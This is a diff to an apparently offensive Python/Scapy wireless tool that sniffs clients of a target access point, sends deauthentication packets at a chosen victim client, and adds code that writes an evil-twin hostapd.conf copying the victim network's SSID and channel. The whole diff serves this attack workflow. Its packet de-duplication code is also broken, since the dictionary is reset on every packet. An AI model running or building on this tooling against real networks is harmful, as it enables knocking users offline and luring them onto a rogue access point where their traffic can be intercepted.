@@ -11,6 +11,7 @@ import threading
 from sys import platform
 import colorama
 from colorama import Fore, Style, Back
+import fileinput,sys
 
 def sniffClients(wlan,BSSID):
 		global a
@@ -24,11 +25,16 @@ def sniffClients(wlan,BSSID):
 			interupted = True
 
 def getClients(pkt):
-	print(a)
+	#print(a)
+	global voc
+	voc = {} #vocabulary for all the pkt info
+	#voc[str(a)] = str(a)
 	bssid = pkt[Dot11].addr3
 	target_bssid = a
 	if target_bssid == bssid and not pkt.haslayer(Dot11Beacon) and not pkt.haslayer(Dot11ProbeReq) and not pkt.haslayer(Dot11ProbeResp):
-		print pkt.summary()
+		if str(pkt.summary()) not in voc:
+			print pkt.summary()
+		voc[str(pkt.summary())] = True
 	#print pkt.summary()
 
 def DeAuthLoop(interface, brdMac, BSSID, numOfPack):
@@ -71,11 +77,20 @@ def main():
     pass
 
   print("Dauth stage: ")
-  #brdMac = 'ff:ff:ff:ff:ff:ff' #brdMac is the broadcast macaddress variable, we set it to all f's because we want to hide where we are sending the packets from
   BSSID = raw_input('Please enter the BSSID/MAC address of the AP: ') #Let the user input the MAC address of the router
 
   print 'Changing ' + wlan + ' to channel ' + str(known[BSSID][1])
   os.system("iwconfig %s channel %d" % (wlan, known[BSSID][1]))
+  
+  #changing hostapd.conf channel to the victim's wifi channel.
+  filename = "/root/eviltwinfiles/hostapd.conf"
+  text = str("#Set wifi interface" + "\n" + "interface=wlan0" + "\n" + "#Set network name" + "\n" + "ssid=" + str(known[BSSID][0]) + "\n" + "#Set channel" + "\n" + "channel=" + str(known[BSSID][1]) + "\n" + "#Set driver" + "\n" + "driver=nl80211")
+  f = open(filename,'w')
+  f.close()
+  f = open(filename,'w')
+  f.write(text)
+  f.close()
+
 
   sniffClients(wlan,BSSID)
   brdMac = raw_input('Please enter the BSSID/MAC address of the client you wish to attack: ')
